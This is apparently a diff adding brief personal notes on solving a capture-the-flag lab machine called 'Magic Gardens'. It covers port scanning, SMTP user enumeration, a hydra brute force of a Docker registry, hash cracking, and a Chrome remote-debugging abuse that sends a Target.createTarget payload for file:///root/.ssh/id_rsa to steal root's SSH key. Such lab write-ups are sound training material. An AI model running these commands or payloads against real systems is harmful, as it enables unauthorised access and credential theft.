@@ -1,1 +1,54 @@
+Name: Magic Gardens
+Difficulty: Insane
+OS: Linux
+
+1) nmap
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
+| ssh-hostkey: 
+|   256 e0:72:62:48:99:33:4f:fc:59:f8:6c:05:59:db:a7:7b (ECDSA)
+|_  256 62:c6:35:7e:82:3e:b1:0f:9b:6f:5b:ea:fe:c5:85:9a (ED25519)
+25/tcp   open  smtp     Postfix smtpd
+|_smtp-commands: magicgardens.magicgardens.htb, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
+80/tcp   open  http     nginx 1.22.1
+|_http-server-header: nginx/1.22.1
+|_http-title: Did not follow redirect to http://magicgardens.htb/
+5000/tcp open  ssl/http Docker Registry (API: 2.0)
+|_http-title: Site doesn't have a title.
+| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
+| Not valid before: 2023-05-23T11:57:43
+|_Not valid after:  2024-05-22T11:57:43
+Service Info: Host:  magicgardens.magicgardens.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+2) msf6 auxiliary(scanner/smtp/smtp_enum) / smtp-user-enum are both valid enum tools
+using xato-10 millions user list 
+command with smtp-user-enum: smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t magicgardens.htb
+alex user found
+
+3) test login with no creds on docker registry api
+curl -u user:password -X GET https://magicgardens.htb:5000/v2/_catalog -k
+unauthorized
+3.1) try to bruteforce on the docker registry service
+hydra -l alex -P /usr/share/wordlists/rockyou.txt -s 5000 -f IP http-get /V2
+https://www.baeldung.com/ops/docker-registry-api-list-images-tags
+3.2) once the creds are obtained 
+https://stackoverflow.com/questions/42211380/add-insecure-registry-to-docker
+sudo docker run -it IP:5000/magicgardens.htb:1.3 bash
+3.3) read the database file in the docker and find morty user and password hash
+3.4) crack the hash
+3.5) ssh with morty works but no flag :(
+3.6) linpeas upload and execution -> --remote-debugging-port exploit
+
+4.1) ssh -L port:127.0.0.1:port morty@magicgardens.htb per fare ssh port forwarding
+4.2) http://localhost:port/json -> http://localhost:port/json/version
+4.3) ws -> websocat
+4.4) chrome dev tools documentation -> createTarget https://chromedevtools.github.io/devtools-protocol/tot/Target/#method-createTarget
+4.5) create the target pointing to file:///root/.ssh/id_rsa -> {"id": 1, "method": "Target.createTarget", "params": {"url": "file:///root/.ssh/id_rsa"}}
+4.6) http://localhost:port/json/version again to get the new id
+4.7) websocat on the new id and read the content with -> websocat -n1 --jsonrpc --jsonrpc-omit-jsonrpc ws://<URL>
+4.8) b64 to pdf convert and get the id_rsa file
+4.9) ssh with the private key and get both the user and the root flag
+
+
+
 
